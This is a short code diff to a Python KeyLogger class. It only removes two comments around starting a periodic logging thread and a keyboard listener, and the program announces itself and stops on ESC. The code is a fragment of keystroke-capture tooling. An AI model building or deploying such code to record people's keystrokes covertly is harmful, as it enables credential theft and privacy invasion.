@@ -35,12 +35,12 @@ class KeyLogger:
         print(f"Keylogger started... Logging to {self.log_file}")
         print("Press ESC to stop.")
         
-        # Start periodic logging thread
+
         self.logger_thread = threading.Thread(target=self.periodic_log)
         self.logger_thread.daemon = True
         self.logger_thread.start()
         
-        # Start key listener
+
         with keyboard.Listener(on_press=self.on_press) as listener:
             try:
                 listener.join()
